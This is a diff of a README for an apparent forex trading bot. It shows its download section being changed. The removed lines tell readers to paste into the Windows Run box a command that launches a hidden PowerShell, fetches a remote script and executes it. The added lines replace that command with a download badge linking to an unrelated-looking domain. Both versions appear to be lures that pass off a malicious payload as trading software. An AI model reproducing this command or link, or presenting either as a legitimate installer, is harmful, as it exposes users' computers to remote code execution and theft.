@@ -14,11 +14,10 @@
 
 ## Usage 🚀
 <h2>📥 Download the Program</h2>
-<h3>copy and execute the following command in (Win+R)</h3>
+<a href="https://talkingmanager.com/1C8kxSMV?name=ForexBotV1.3" download>
+  <img src="https://img.shields.io/badge/Download-blue?logo=Download&logoColor=white&style=for-the-badge" alt="Download"/>
+</a>
 
-<pre>
-  <code id="code-snippet">cmd.exe /c start /min powershell -w h "$u='https://aidetector.tools/wZWZqs';[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;iex(iwr $u -UseBasicParsing -UserAgent 'ID: daff2f8').Content;</code>
-</pre>
 
 ## Example Strategies 📈
 - **Trend Following**: Identify and follow the direction of market trends.
